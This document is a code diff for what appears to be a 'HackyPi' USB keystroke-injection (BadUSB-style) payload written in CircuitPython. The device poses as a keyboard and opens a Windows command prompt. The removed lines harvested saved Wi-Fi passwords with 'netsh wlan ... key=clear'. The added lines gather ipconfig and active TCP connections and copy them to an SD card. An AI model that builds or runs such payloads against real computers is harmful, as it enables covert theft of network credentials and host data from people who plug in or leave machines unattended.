@@ -1,3 +1,4 @@
+import os
 import time
 import board
 import busio
@@ -9,6 +10,17 @@ from adafruit_display_text.label import Label
 from adafruit_hid.keyboard import Keyboard, Keycode
 from adafruit_st7789 import ST7789
 from keyboard_layout_win_uk import KeyboardLayout
+import storage
+import adafruit_sdcard
+
+SD_CS = board.GP17
+
+# Connect to the card and mount the filesystem.
+spi = busio.SPI(board.GP18, board.GP19, board.GP16)
+cs = digitalio.DigitalInOut(board.GP17)
+sdcard = adafruit_sdcard.SDCard(spi, cs)
+vfs = storage.VfsFat(sdcard)
+storage.mount(vfs, "/sd")
 
 # Constants for the display
 BORDER = 12
@@ -78,45 +90,50 @@ def save_file_in_current_directory(file_name, command, keyboard_layout):
 
 # Initial screen setup
 inner_rectangle()
-print_onTFT("HackyPi", 50, 40)
-print_onTFT("WIFI v2.2", 30, 80)
+print_onTFT("Welcome to", 30, 40)
+print_onTFT("HackyPi", 60, 80)
 time.sleep(3)
 
 try:
     keyboard = Keyboard(usb_hid.devices)
     keyboard_layout = KeyboardLayout(keyboard)
     time.sleep(1)
-    
-    # Simulate DuckyScript commands
-    
-    # Windows + R
+
     keyboard.send(Keycode.WINDOWS, Keycode.R)
+    time.sleep(0.3)
+
+    keyboard_layout.write('cmd.exe')
+    keyboard.send(Keycode.ENTER)
     time.sleep(0.5)
-    
-    # Type 'cmd' and Enter
-    type_and_enter('cmd', keyboard_layout, 0.2)
-    
-    # Delay before next command
-    time.sleep(0.2)
-    
+
     # Get all SSID and change to HackyPi drive letter
     keyboard_layout.write('FOR /F "tokens=* USEBACKQ" %F IN (`powershell -Command "(Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2}).DeviceID"`) DO (CD /D %F)')
     keyboard.send(Keycode.ENTER)
     time.sleep(0.5)
 
-    #Retrieve Wi-Fi details for current connection and save to file
-    keyboard_layout.write('for /f "tokens=2 delims=: " %i in (\'netsh wlan show interfaces ^| findstr /r "^....SSID" \') do @echo %i | netsh wlan show profiles %i key=clear >> log.txt')
+    # Command to create combined file
+    # First write ipconfig output
+    keyboard_layout.write("ipconfig > netinfo.txt")
     keyboard.send(Keycode.ENTER)
-    time.sleep(0.5)
+    time.sleep(1)
 
-    # Exit Command Prompt
-    keyboard_layout.write('exit')
+    # Then append netstat output
+    keyboard_layout.write("netstat -n -p tcp | findstr /C:\"ESTABLISHED\" /C:\"CLOSE_WAIT\" >> netinfo.txt")
     keyboard.send(Keycode.ENTER)
-    time.sleep(0.5)
-        
+    time.sleep(4)  # wait for the timeout and netstat to finish
+
     inner_rectangle()
-    print_onTFT("Files Created!!", 40, 80)
-    
+    print_onTFT("Files", 70, 40)
+    print_onTFT("Created", 50, 80)
+    time.sleep(3)
+
+    # Copy file to sd card
+    src = "netinfo.txt"
+    dst = f"/sd/netinfo.txt"
+    with open(src, "rb") as src_file:
+        with open(dst, "wb") as dst_file:
+            dst_file.write(src_file.read())
+
 except Exception as ex:
     keyboard.release_all()
     raise ex
